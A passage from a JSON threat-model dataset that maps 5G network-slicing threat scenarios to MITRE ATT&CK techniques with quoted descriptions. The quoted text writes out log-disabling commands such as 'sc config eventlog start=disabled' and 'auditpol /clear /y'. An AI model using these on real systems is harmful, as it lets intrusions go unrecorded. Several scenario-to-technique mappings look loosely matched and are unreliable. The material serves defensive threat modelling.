                "description": "Processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.\n\nAdversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.\n\n### Services\n\nManipulation of Windows service binaries is one variation of this technique. Adversaries may replace a legitimate service executable with their own executable to gain persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService). Once the service is started, either directly by the user (if appropriate access is available) or through some other means, such as a system restart if the service starts on bootup, the replaced executable will run instead of the original service executable.\n\n### Executable Installers\n\nAnother variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the <code>%TEMP%</code> directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1038). Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to [Bypass User Account Control](https://attack.mitre.org/techniques/T1088). Several examples of this weakness in existing common installers have been reported to software vendors. (Citation: Mozilla Firefox Installer DLL Hijack) (Citation: Seclists Kanthak 7zip Installer)",
                "id": "attack-pattern--0ca7beef-9bbc-4e35-97cf-437384ddce6a",
                "technique_id": "T1044"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "A malicious user bypasses security controls to gain access to administrative functions.",
            "Assumptions": [
                {
                    "Assumption": "Weak or default credentials in use.",
                    "Role": "System",
                    "Condition": "True if the system uses weak or default credentials."
                },
                {
                    "Assumption": "Inadequate access control enforcement.",
                    "Role": "System",
                    "Condition": "True if access control mechanisms are not robust."
                }
            ],
            "Potential Impact": "Gaining administrative access leading to potential misuse and data breach.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "bypass security controls",
                "administrative access",
                "default credentials"
            ],
            "mitre_technique": {
                "name": "Cloud Accounts",
                "description": "Valid accounts in cloud environments may allow adversaries to perform actions to achieve Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Cloud accounts are those created and configured by an organization for use by users, remote support, services, or for administration of resources within a cloud service provider or SaaS application. Cloud Accounts can exist solely in the cloud; alternatively, they may be hybrid-joined between on-premises systems and the cloud through syncing or federation with other identity sources such as Windows Active Directory. (Citation: AWS Identity Federation)(Citation: Google Federating GC)(Citation: Microsoft Deploying AD Federation)\n\nService or user accounts may be targeted by adversaries through [Brute Force](https://attack.mitre.org/techniques/T1110), [Phishing](https://attack.mitre.org/techniques/T1566), or various other means to gain access to the environment. Federated or synced accounts may be a pathway for the adversary to affect both on-premises systems and cloud environments - for example, by leveraging shared credentials to log onto [Remote Services](https://attack.mitre.org/techniques/T1021). High privileged cloud accounts, whether federated, synced, or cloud-only, may also allow pivoting to on-premises environments by leveraging SaaS-based [Software Deployment Tools](https://attack.mitre.org/techniques/T1072) to run commands on hybrid-joined devices.\n\nAn adversary may create long lasting [Additional Cloud Credentials](https://attack.mitre.org/techniques/T1098/001) on a compromised cloud account to maintain persistence in the environment. Such credentials may also be used to bypass security controls such as multi-factor authentication. \n\nCloud accounts may also be able to assume [Temporary Elevated Cloud Access](https://attack.mitre.org/techniques/T1548/005) or other privileges through various means within the environment. Misconfigurations in role assignments or role assumption policies may allow an adversary to use these mechanisms to leverage permissions outside the intended scope of the account. Such over privileged accounts may be used to harvest sensitive data from online storage accounts and databases through [Cloud API](https://attack.mitre.org/techniques/T1059/009) or other methods. \n",
                "id": "attack-pattern--f232fa7a-025c-4d43-abc7-318e81a73d65",
                "technique_id": "T1078.004"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker escalates privileges by exploiting a flaw in the orchestration system.",
            "Assumptions": [
                {
                    "Assumption": "The orchestration system has an unpatched vulnerability.",
                    "Role": "System",
                    "Condition": "True if relevant patches are not applied."
                },
                {
                    "Assumption": "No effective monitoring to detect privilege escalation attempts.",
                    "Role": "System",
                    "Condition": "True if the system does not monitor and alert on privilege escalation activities."
                }
            ],
            "Potential Impact": "Compromise of management layer allowing extensive control over network slices.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "orchestration system",
                "privilege escalation",
                "control"
            ],
            "mitre_technique": {
                "name": "Scheduled Task",
                "description": "Adversaries may abuse the Windows Task Scheduler to perform task scheduling for initial or recurring execution of malicious code. There are multiple ways to access the Task Scheduler in Windows. The [schtasks](https://attack.mitre.org/software/S0111) utility can be run directly on the command line, or the Task Scheduler can be opened through the GUI within the Administrator Tools section of the Control Panel. In some cases, adversaries have used a .NET wrapper for the Windows Task Scheduler, and alternatively, adversaries have used the Windows netapi32 library to create a scheduled task.\n\nThe deprecated [at](https://attack.mitre.org/software/S0110) utility could also be abused by adversaries (ex: [At](https://attack.mitre.org/techniques/T1053/002)), though <code>at.exe</code> can not access tasks created with <code>schtasks</code> or the Control Panel.\n\nAn adversary may use Windows Task Scheduler to execute programs at system startup or on a scheduled basis for persistence. The Windows Task Scheduler can also be abused to conduct remote Execution as part of Lateral Movement and/or to run a process under the context of a specified account (such as SYSTEM). Similar to [System Binary Proxy Execution](https://attack.mitre.org/techniques/T1218), adversaries have also abused the Windows Task Scheduler to potentially mask one-time execution under signed/trusted system processes.(Citation: ProofPoint Serpent)\n\nAdversaries may also create \"hidden\" scheduled tasks (i.e. [Hide Artifacts](https://attack.mitre.org/techniques/T1564)) that may not be visible to defender tools and manual queries used to enumerate tasks. Specifically, an adversary may hide a task from `schtasks /query` and the Task Scheduler by deleting the associated Security Descriptor (SD) registry value (where deletion of this value must be completed using SYSTEM permissions).(Citation: SigmaHQ)(Citation: Tarrask scheduled task) Adversaries may also employ alternate methods to hide tasks, such as altering the metadata (e.g., `Index` value) within associated registry keys.(Citation: Defending Against Scheduled Task Attacks in Windows Environments) ",
                "id": "attack-pattern--005a06c6-14bf-4118-afa0-ebcd8aebb0c9",
                "technique_id": "T1053.005"
            }
        }
    ]
},
{
    "case_number": "3",
    "batch_number": "18",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker could spoof a network function's identity to gain unauthorized access to network slices.",
            "Assumptions": [
                {
                    "Assumption": "Weak authentication between NFs",
                    "Role": "Network Operator",
                    "Condition": "Authentication mechanisms are not robust"
                },
                {
                    "Assumption": "Lack of SSL/TLS encryption",
                    "Role": "Network Engineer",
                    "Condition": "Communication channels are not encrypted"
                },
                {
                    "Assumption": "Insufficient monitoring",
                    "Role": "Security Analyst",
                    "Condition": "Monitoring systems do not detect anomalous access"
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive data and network resources.",
            "MITRE ATT&CK Keywords": [
                "credential manipulation",
                "network function",
                "spoofing",
                "5G"
            ],
            "mitre_technique": {
                "name": "ARP Cache Poisoning",
                "description": "Adversaries may poison Address Resolution Protocol (ARP) caches to position themselves between the communication of two or more networked devices. This activity may be used to enable follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040) or [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002).\n\nThe ARP protocol is used to resolve IPv4 addresses to link layer addresses, such as a media access control (MAC) address.(Citation: RFC826 ARP) Devices in a local network segment communicate with each other by using link layer addresses. If a networked device does not have the link layer address of a particular networked device, it may send out a broadcast ARP request to the local network to translate the IP address to a MAC address. The device with the associated IP address directly replies with its MAC address. The networked device that made the ARP request will then use as well as store that information in its ARP cache.\n\nAn adversary may passively wait for an ARP request to poison the ARP cache of the requesting device. The adversary may reply with their MAC address, thus deceiving the victim by making them believe that they are communicating with the intended networked device. For the adversary to poison the ARP cache, their reply must be faster than the one made by the legitimate IP address owner. Adversaries may also send a gratuitous ARP reply that maliciously announces the ownership of a particular IP address to all the devices in the local network segment.\n\nThe ARP protocol is stateless and does not require authentication. Therefore, devices may wrongly add or update the MAC address of the IP address in their ARP cache.(Citation: Sans ARP Spoofing Aug 2003)(Citation: Cylance Cleaver)\n\nAdversaries may use ARP cache poisoning as a means to intercept network traffic. This activity may be used to collect and/or relay data such as credentials, especially those sent over an insecure, unencrypted protocol.(Citation: Sans ARP Spoofing Aug 2003)\n",
                "id": "attack-pattern--cabe189c-a0e3-4965-a473-dcff00f17213",
                "technique_id": "T1557.002"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "Malicious entities could spoof edge computing nodes to intercept data.",
            "Assumptions": [
                {
                    "Assumption": "Inadequate validation of node identity",
                    "Role": "Network Protector",
                    "Condition": "Node identity is not robustly validated"
                },
                {
                    "Assumption": "Lack of mutual authentication",
                    "Role": "System Architect",
                    "Condition": "Mutual authentication is not enforced"
                },
                {
                    "Assumption": "Unsecured physical access to nodes",
                    "Role": "Physical Security Team",
                    "Condition": "Physical security controls are weak"
                }
            ],
            "Potential Impact": "Interception of sensitive data and potential data leakage.",
            "MITRE ATT&CK Keywords": [
                "man-in-the-middle",
                "edge computing",
                "spoofing",
                "data interception"
            ],
            "mitre_technique": {
                "name": "Phishing for Information",
                "description": "Adversaries may send phishing messages to elicit sensitive information that can be used during targeting. Phishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Phishing for information is different from [Phishing](https://attack.mitre.org/techniques/T1566) in that the objective is gathering data from the victim rather than executing malicious code.\n\nAll forms of phishing are electronically delivered social engineering. Phishing can be targeted, known as spearphishing. In spearphishing, a specific individual, company, or industry will be targeted by the adversary. More generally, adversaries can conduct non-targeted phishing, such as in mass credential harvesting campaigns.\n\nAdversaries may also try to obtain information directly through the exchange of emails, instant messages, or other electronic conversation means.(Citation: ThreatPost Social Media Phishing)(Citation: TrendMictro Phishing)(Citation: PCMag FakeLogin)(Citation: Sophos Attachment)(Citation: GitHub Phishery) Victims may also receive phishing messages that direct them to call a phone number where the adversary attempts to collect confidential information.(Citation: Avertium callback phishing)\n\nPhishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)) and/or sending multiple, seemingly urgent messages. Another way to accomplish this is by forging or spoofing(Citation: Proofpoint-spoof) the identity of the sender which can be used to fool both the human recipient as well as automated security tools.(Citation: cyberproof-double-bounce) \n\nPhishing for information may also involve evasive techniques, such as removing or manipulating emails or metadata/headers from compromised accounts being abused to send messages (e.g., [Email Hiding Rules](https://attack.mitre.org/techniques/T1564/008)).(Citation: Microsoft OAuth Spam 2022)(Citation: Palo Alto Unit 42 VBA Infostealer 2014)",
                "id": "attack-pattern--cca0ccb6-a068-4574-a722-b1556f86833a",
                "technique_id": "T1598"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "Threat actors could pose as authorized service providers to gain access to external interfaces.",
            "Assumptions": [
                {
                    "Assumption": "Insufficient verification of service providers",
                    "Role": "Service Manager",
                    "Condition": "Verification processes are weak"
                },
                {
                    "Assumption": "Lack of endpoint security",
                    "Role": "Endpoint Security Manager",
                    "Condition": "Endpoints are not secured"
                },
                {
                    "Assumption": "Limited PKI infrastructure",
                    "Role": "Infrastructure Engineer",
                    "Condition": "Public Key Infrastructure is not fully implemented"
                }
            ],
            "Potential Impact": "Unauthorized external access leading to potential breaches and data exfiltration.",
            "MITRE ATT&CK Keywords": [
                "external interface",
                "service provider",
                "spoofing",
                "unauthorized access"
            ],
            "mitre_technique": {
                "name": "Trusted Relationship",
                "description": "Adversaries may breach or otherwise leverage organizations who have access to intended victims. Access through trusted third party relationship abuses an existing connection that may not be protected or receives less scrutiny than standard mechanisms of gaining access to a network.\n\nOrganizations often grant elevated access to second or third-party external providers in order to allow them to manage internal systems as well as cloud-based environments. Some examples of these relationships include IT services contractors, managed security providers, infrastructure contractors (e.g. HVAC, elevators, physical security). The third-party provider's access may be intended to be limited to the infrastructure being maintained, but may exist on the same network as the rest of the enterprise. As such, [Valid Accounts](https://attack.mitre.org/techniques/T1078) used by the other party for access to internal network systems may be compromised and used.(Citation: CISA IT Service Providers)\n\nIn Office 365 environments, organizations may grant Microsoft partners or resellers delegated administrator permissions. By compromising a partner or reseller account, an adversary may be able to leverage existing delegated administrator relationships or send new delegated administrator offers to clients in order to gain administrative control over the victim tenant.(Citation: Office 365 Delegated Administration)",
                "id": "attack-pattern--9fa07bef-9c81-421e-a8e5-ad4366c5a925",
                "technique_id": "T1199"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker could tamper with VNFs to alter network behavior.",
            "Assumptions": [
                {
                    "Assumption": "Weak access controls on VNF deployment",
                    "Role": "DevOps Engineer",
                    "Condition": "Access controls are insufficient"
                },
                {
                    "Assumption": "Lack of integrity checks on VNFs",
                    "Role": "Security Compliance Officer",
                    "Condition": "Integrity checks are not enforced"
                },
                {
                    "Assumption": "Unsegregated deployment environments",
                    "Role": "System Administrator",
                    "Condition": "Environments are not isolated"
                }
            ],
            "Potential Impact": "Altered network performance and potentially compromising network slice integrity.",
            "MITRE ATT&CK Keywords": [
                "VNF",
                "tampering",
                "network behavior",
                "control plane"
            ],
            "mitre_technique": {
                "name": "Disable or Modify Tools",
                "description": "Adversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities. This may take many forms, such as killing security software processes or services, modifying / deleting Registry keys or configuration files so that tools do not operate properly, or other methods to interfere with security tools scanning or reporting information. Adversaries may also disable updates to prevent the latest security patches from reaching tools on victim systems.(Citation: SCADAfence_ransomware)\n\nAdversaries may also tamper with artifacts deployed and utilized by security tools. Security tools may make dynamic changes to system components in order to maintain visibility into specific events. For example, security products may load their own modules and/or modify those loaded by processes to facilitate data collection. Similar to [Indicator Blocking](https://attack.mitre.org/techniques/T1562/006), adversaries may unhook or otherwise modify these features added by tools (especially those that exist in userland or are otherwise potentially accessible to adversaries) to avoid detection.(Citation: OutFlank System Calls)(Citation: MDSec System Calls) \n\nAdversaries may also focus on specific applications such as Sysmon. For example, the \u201cStart\u201d and \u201cEnable\u201d values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Microsoft-Windows-Sysmon-Operational</code> may be modified to tamper with and potentially disable Sysmon logging.(Citation: disable_win_evt_logging) \n\nOn network devices, adversaries may attempt to skip digital signature verification checks by altering startup configuration files and effectively disabling firmware verification that typically occurs at boot.(Citation: Fortinet Zero-Day and Custom Malware Used by Suspected Chinese Actor in Espionage Operation)(Citation: Analysis of FG-IR-22-369)\n\nIn cloud environments, tools disabled by adversaries may include cloud monitoring agents that report back to services such as AWS CloudWatch or Google Cloud Monitor.\n\nFurthermore, although defensive tools may have anti-tampering mechanisms, adversaries may abuse tools such as legitimate rootkit removal kits to impair and/or disable these tools.(Citation: chasing_avaddon_ransomware)(Citation: dharma_ransomware)(Citation: demystifying_ryuk)(Citation: doppelpaymer_crowdstrike) For example, adversaries have used tools such as GMER to find and shut down hidden processes and antivirus software on infected systems.(Citation: demystifying_ryuk)\n\nAdditionally, adversaries may exploit legitimate drivers from anti-virus software to gain access to kernel space (i.e. [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068)), which may lead to bypassing anti-tampering features.(Citation: avoslocker_ransomware)",
                "id": "attack-pattern--ac08589e-ee59-4935-8667-d845e38fe579",
                "technique_id": "T1562.001"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Cyber-espionage groups could modify orchestration scripts to cause deployment of vulnerable configurations.",
            "Assumptions": [
                {
                    "Assumption": "Insufficient script signature validation",
                    "Role": "Orchestrator",
                    "Condition": "Validation of scripts is bypassed"
                },
                {
                    "Assumption": "Weak protections on orchestration tools",
                    "Role": "Tools Administrator",
                    "Condition": "Tools are not properly secured"
                },
                {
                    "Assumption": "Lack of continuous monitoring",
                    "Role": "Security Team",
                    "Condition": "Monitoring systems are inadequate"
                }
            ],
            "Potential Impact": "Deployment of exploitable configurations and potential unauthorized access.",
            "MITRE ATT&CK Keywords": [
                "orchestration",
                "tampering",
                "deployment script",
                "cyber espionage"
            ],
            "mitre_technique": {
                "name": "Container Orchestration Job",
                "description": "Adversaries may abuse task scheduling functionality provided by container orchestration tools such as Kubernetes to schedule deployment of containers configured to execute malicious code. Container orchestration jobs run these automated tasks at a specific date and time, similar to cron jobs on a Linux system. Deployments of this type can also be configured to maintain a quantity of containers over time, automating the process of maintaining persistence within a cluster.\n\nIn Kubernetes, a CronJob may be used to schedule a Job that runs one or more containers to perform specific tasks.(Citation: Kubernetes Jobs)(Citation: Kubernetes CronJob) An adversary therefore may utilize a CronJob to schedule deployment of a Job that executes malicious code in various nodes within a cluster.(Citation: Threat Matrix for Kubernetes)",
                "id": "attack-pattern--1126cab1-c700-412f-a510-61f4937bb096",
                "technique_id": "T1053.007"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Unauthorized changes to configuration settings via external interfaces.",
            "Assumptions": [
                {
                    "Assumption": "External interfaces not sufficiently hardened",
                    "Role": "Network Interface Engineer",
                    "Condition": "Interfaces lack hardening"
                },
                {
                    "Assumption": "Insufficient logging of configuration changes",
                    "Role": "Audit Manager",
                    "Condition": "Changes are not logged adequately"
                },
                {
                    "Assumption": "Weak API security",
                    "Role": "API Developer",
                    "Condition": "APIs are not secured properly"
                }
            ],
            "Potential Impact": "Configuration changes leading to system instability and potential security breaches.",
            "MITRE ATT&CK Keywords": [
                "configuration settings",
                "external interface",
                "tampering",
                "API security"
            ],
            "mitre_technique": {
                "name": "Disable or Modify Tools",
                "description": "Adversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities. This may take many forms, such as killing security software processes or services, modifying / deleting Registry keys or configuration files so that tools do not operate properly, or other methods to interfere with security tools scanning or reporting information. Adversaries may also disable updates to prevent the latest security patches from reaching tools on victim systems.(Citation: SCADAfence_ransomware)\n\nAdversaries may also tamper with artifacts deployed and utilized by security tools. Security tools may make dynamic changes to system components in order to maintain visibility into specific events. For example, security products may load their own modules and/or modify those loaded by processes to facilitate data collection. Similar to [Indicator Blocking](https://attack.mitre.org/techniques/T1562/006), adversaries may unhook or otherwise modify these features added by tools (especially those that exist in userland or are otherwise potentially accessible to adversaries) to avoid detection.(Citation: OutFlank System Calls)(Citation: MDSec System Calls) \n\nAdversaries may also focus on specific applications such as Sysmon. For example, the \u201cStart\u201d and \u201cEnable\u201d values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Microsoft-Windows-Sysmon-Operational</code> may be modified to tamper with and potentially disable Sysmon logging.(Citation: disable_win_evt_logging) \n\nOn network devices, adversaries may attempt to skip digital signature verification checks by altering startup configuration files and effectively disabling firmware verification that typically occurs at boot.(Citation: Fortinet Zero-Day and Custom Malware Used by Suspected Chinese Actor in Espionage Operation)(Citation: Analysis of FG-IR-22-369)\n\nIn cloud environments, tools disabled by adversaries may include cloud monitoring agents that report back to services such as AWS CloudWatch or Google Cloud Monitor.\n\nFurthermore, although defensive tools may have anti-tampering mechanisms, adversaries may abuse tools such as legitimate rootkit removal kits to impair and/or disable these tools.(Citation: chasing_avaddon_ransomware)(Citation: dharma_ransomware)(Citation: demystifying_ryuk)(Citation: doppelpaymer_crowdstrike) For example, adversaries have used tools such as GMER to find and shut down hidden processes and antivirus software on infected systems.(Citation: demystifying_ryuk)\n\nAdditionally, adversaries may exploit legitimate drivers from anti-virus software to gain access to kernel space (i.e. [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068)), which may lead to bypassing anti-tampering features.(Citation: avoslocker_ransomware)",
                "id": "attack-pattern--ac08589e-ee59-4935-8667-d845e38fe579",
                "technique_id": "T1562.001"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Users could deny actions taken in the management of network slices due to insufficient logging.",
            "Assumptions": [
                {
                    "Assumption": "Logs are not tamper-proof",
                    "Role": "Logging Administrator",
                    "Condition": "Logs can be easily altered"
                },
                {
                    "Assumption": "Insufficient audit trails",
                    "Role": "Audit Manager",
                    "Condition": "Audit trails are incomplete"
                },
                {
                    "Assumption": "Weak user authentication",
                    "Role": "User Access Manager",
                    "Condition": "User authentication is weak"
                }
            ],
            "Potential Impact": "Difficulties in incident analysis and accountability in managing network slices.",
            "MITRE ATT&CK Keywords": [
                "logging",
                "repudiation",
                "network slice",
                "user actions"
            ],
            "mitre_technique": {
                "name": "Clear Linux or Mac System Logs",
                "description": "Adversaries may clear system logs to hide evidence of an intrusion. macOS and Linux both keep track of system or user-initiated actions via system logs. The majority of native system logging is stored under the <code>/var/log/</code> directory. Subfolders in this directory categorize logs by their related functions, such as:(Citation: Linux Logs)\n\n* <code>/var/log/messages:</code>: General and system-related messages\n* <code>/var/log/secure</code> or <code>/var/log/auth.log</code>: Authentication logs\n* <code>/var/log/utmp</code> or <code>/var/log/wtmp</code>: Login records\n* <code>/var/log/kern.log</code>: Kernel logs\n* <code>/var/log/cron.log</code>: Crond logs\n* <code>/var/log/maillog</code>: Mail server logs\n* <code>/var/log/httpd/</code>: Web server access and error logs\n",
                "id": "attack-pattern--2bce5b30-7014-4a5d-ade7-12913fe6ac36",
                "technique_id": "T1070.002"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Internal employees could alter orchestration and management logs to obscure unauthorized actions.",
            "Assumptions": [
                {
                    "Assumption": "Logging mechanisms are bypassable",
                    "Role": "Logging Engineer",
                    "Condition": "Mechanisms can be bypassed"
                },
                {
                    "Assumption": "User roles are poorly defined",
                    "Role": "HR Manager",
                    "Condition": "User roles are unclear"
                },
                {
                    "Assumption": "Lack of integrity-check tools",
                    "Role": "Security Analyst",
                    "Condition": "No tools to check integrity of logs"
                }
            ],
            "Potential Impact": "Hidden unauthorized changes in orchestration leading to security blind spots.",
            "MITRE ATT&CK Keywords": [
                "insider threat",
                "orchestration",
                "repudiation",
                "log tampering"
            ],
            "mitre_technique": {
                "name": "Kernel Modules and Extensions",
                "description": "Loadable Kernel Modules (or LKMs) are pieces of code that can be loaded and unloaded into the kernel upon demand. They extend the functionality of the kernel without the need to reboot the system. For example, one type of module is the device driver, which allows the kernel to access hardware connected to the system. (Citation: Linux Kernel Programming)\u00a0When used maliciously, Loadable Kernel Modules (LKMs) can be a type of kernel-mode [Rootkit](https://attack.mitre.org/techniques/T1014) that run with the highest operating system privilege (Ring 0). (Citation: Linux Kernel Module Programming Guide)\u00a0Adversaries can use loadable kernel modules to covertly persist on a system and evade defenses. Examples have been found in the wild and there are some open source projects. (Citation: Volatility Phalanx2) (Citation: CrowdStrike Linux Rootkit) (Citation: GitHub Reptile) (Citation: GitHub Diamorphine)\n\nCommon features of LKM based rootkits include: hiding itself, selective hiding of files, processes and network activity, as well as log tampering, providing authenticated backdoors and enabling root access to non-privileged users. (Citation: iDefense Rootkit Overview)\n\nKernel extensions, also called kext, are used for macOS to load functionality onto a system similar to LKMs for Linux. They are loaded and unloaded through <code>kextload</code> and <code>kextunload</code> commands. Several examples have been found where this can be used. (Citation: RSAC 2015 San Francisco Patrick Wardle) (Citation: Synack Secure Kernel Extension Broken) Examples have been found in the wild. (Citation: Securelist Ventir)",
                "id": "attack-pattern--6be14413-578e-46c1-8304-310762b3ecd5",
                "technique_id": "T1215"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Service providers could deny unauthorized access attempts due to lack of proper logging at external interfaces.",
            "Assumptions": [
                {
                    "Assumption": "No centralized logging for external access",
                    "Role": "External Interface Manager",
                    "Condition": "Central logs are missing"
                },
                {
                    "Assumption": "Insufficient access control enforcement",
                    "Role": "Access Control Manager",
                    "Condition": "Controls are inadequate"
                },
                {
                    "Assumption": "Lack of multifactor authentication",
                    "Role": "Security Protocol Officer",
                    "Condition": "No multifactor authentication in place"
                }
            ],
            "Potential Impact": "Difficulty in tracking access attempts and potential compromise.",
            "MITRE ATT&CK Keywords": [
                "external access",
                "logging",
                "repudiation",
                "service provider"
            ],
            "mitre_technique": {
                "name": "Disable Windows Event Logging",
                "description": "Adversaries may disable Windows event logging to limit data that can be leveraged for detections and audits. Windows event logs record user and system activity such as login attempts, process creation, and much more.(Citation: Windows Log Events) This data is used by security tools and analysts to generate detections.\n\nThe EventLog service maintains event logs from various system components and applications.(Citation: EventLog_Core_Technologies) By default, the service automatically starts when a system powers on. An audit policy, maintained by the Local Security Policy (secpol.msc), defines which system events the EventLog service logs. Security audit policy settings can be changed by running secpol.msc, then navigating to <code>Security Settings\\Local Policies\\Audit Policy</code> for basic audit policy settings or <code>Security Settings\\Advanced Audit Policy Configuration</code> for advanced audit policy settings.(Citation: Audit_Policy_Microsoft)(Citation: Advanced_sec_audit_policy_settings) <code>auditpol.exe</code> may also be used to set audit policies.(Citation: auditpol)\n\nAdversaries may target system-wide logging or just that of a particular application. For example, the Windows EventLog service may be disabled using the <code>Set-Service -Name EventLog -Status Stopped</code> or <code>sc config eventlog start=disabled</code> commands (followed by manually stopping the service using <code>Stop-Service  -Name EventLog</code>).(Citation: Disable_Win_Event_Logging)(Citation: disable_win_evt_logging) Additionally, the service may be disabled by modifying the \u201cStart\u201d value in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\EventLog</code> then restarting the system for the change to take effect.(Citation: disable_win_evt_logging)\n\nThere are several ways to disable the EventLog service via registry key modification. First, without Administrator privileges, adversaries may modify the \"Start\" value in the key <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Security</code>, then reboot the system to disable the Security EventLog.(Citation: winser19_file_overwrite_bug_twitter) Second, with Administrator privilege, adversaries may modify the same values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-System</code> and <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Application</code> to disable the entire EventLog.(Citation: disable_win_evt_logging)\n\nAdditionally, adversaries may use <code>auditpol</code> and its sub-commands in a command prompt to disable auditing or clear the audit policy. To enable or disable a specified setting or audit category, adversaries may use the <code>/success</code> or <code>/failure</code> parameters. For example, <code>auditpol /set /category:\u201dAccount Logon\u201d /success:disable /failure:disable</code> turns off auditing for the Account Logon category.(Citation: auditpol.exe_STRONTIC)(Citation: T1562.002_redcanaryco) To clear the audit policy, adversaries may run the following lines: <code>auditpol /clear /y</code> or <code>auditpol /remove /allusers</code>.(Citation: T1562.002_redcanaryco)\n\nBy disabling Windows event logging, adversaries can operate while leaving less evidence of a compromise behind.",
                "id": "attack-pattern--4eb28bed-d11a-4641-9863-c2ac017d910a",
                "technique_id": "T1562.002"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Sensitive data could be intercepted due to unencrypted communications between network functions.",
            "Assumptions": [
                {
                    "Assumption": "No use of strong encryption protocols",
                    "Role": "Network Security Engineer",
                    "Condition": "Encryption protocols are weak"
                },
                {
                    "Assumption": "Public network usage without encryption",
                    "Role": "Network Administrator",
                    "Condition": "Use of public networks"
                },
                {
                    "Assumption": "Lack of encryption key management",
                    "Role": "Cryptography Manager",
                    "Condition": "Key management is weak or non-existent"
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive data including user and network information.",
            "MITRE ATT&CK Keywords": [
                "unencrypted communication",
                "data interception",
                "information disclosure",
                "network traffic"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "External interfaces might leak sensitive operational data if not properly secured.",
            "Assumptions": [
                {
                    "Assumption": "APIs are not properly validated",
                    "Role": "API Security Engineer",
                    "Condition": "Validation is weak or missing"
                },
                {
                    "Assumption": "Interface endpoints are exposed",
                    "Role": "Endpoint Security Manager",
                    "Condition": "Endpoints are not hidden or protected"
                },
